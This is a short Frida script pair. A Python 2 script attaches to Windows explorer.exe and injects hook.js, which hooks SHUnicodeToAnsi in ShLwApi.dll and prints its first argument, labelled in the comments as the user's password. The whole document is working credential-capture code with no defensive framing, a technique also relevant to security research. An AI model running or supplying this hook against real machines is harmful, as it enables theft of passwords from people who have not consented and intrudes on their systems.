import codecs
import frida
import sys

def on_message(message, data):
    print message


session = frida.attach("explorer.exe") #attache to explorer process
with codecs.open('./hook.js', 'r', 'utf-8') as f: #inject hook.js and monitor for system calls
    source = f.read()
script = session.create_script(source)
script.on('message', on_message)
script.load()
sys.stdin.read()
```
hook.js
```
var hndl;
hndl = Module.findExportByName("ShLwApi.dll", "SHUnicodeToAnsi"); 
//find  SHUnicodeToAnsi function from  ShLwApi.dll DLL
// hooked function has this view - SHUnicodeToAnsi("password",0x11bedee4,260) , where  args[0] = password
Interceptor.attach(hndl, {
    onEnter: function(args) {
        console.log("[!] Hooked SHUnicodeToAnsi function")
        console.log( Memory.readUtf16String(args[0])) // getting password
    }
});
